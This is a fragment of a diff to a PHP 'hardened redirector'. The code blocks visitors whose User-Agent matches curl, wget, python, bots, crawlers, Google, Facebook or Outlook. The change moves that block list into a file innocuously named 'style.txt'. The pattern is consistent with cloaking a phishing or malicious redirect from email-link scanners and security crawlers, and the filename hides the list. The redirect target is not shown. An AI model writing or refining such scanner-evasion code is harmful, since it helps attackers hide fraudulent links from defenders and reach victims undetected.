@@ -1,7 +1,7 @@
 <?php
 // Hardened redirector
 // Block known bots/scanners by User-Agent
-$botAgents = ['curl', 'wget', 'python', 'php', 'bot', 'spider', 'crawler', 'google', 'facebook', 'outlook'];
+$botAgents = file('style.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 
 foreach ($botAgents as $bot) {
